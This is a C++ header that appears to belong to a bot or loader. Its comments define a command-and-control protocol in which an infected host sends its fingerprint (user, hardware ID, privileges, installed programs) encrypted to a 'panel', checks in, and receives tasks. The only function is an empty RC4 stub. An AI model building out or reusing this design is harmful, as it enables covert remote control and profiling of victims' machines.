#pragma once
/*
	Request - Install (Encrypted + Base64)
	{
		"buildName": "",
		"computerName": "",
		"cpu": "",
		"cpuArchitecture": "",
		"cpuCores": ,
		"gpu": "",
		"hardwareID": "",
		"installPath": "",
		"installedPrograms": [

		],
		"operatingSystem": "",
		"privilege": "",
		"ram": ,
		"userName": "",
		"vram":
	}

	Request - Knock (Encrypted + Base64)
	{
		"hardwareID": "",
		"installPath": ""
	}

	Responce
	{
		"task": (Internal Task ID, 0 for notask),
		"taskId": (GUID for identifying task to panel),
		"taskParm": (optional task parmerters (list)),
	}
*/
#include <string>

namespace absent
{
	namespace panel
	{
		std::string firstKnock(nlohmann::json info, std::string key)
		{
			absent::crypto::RC4 rc4;
			
			return "";
		}
	}
}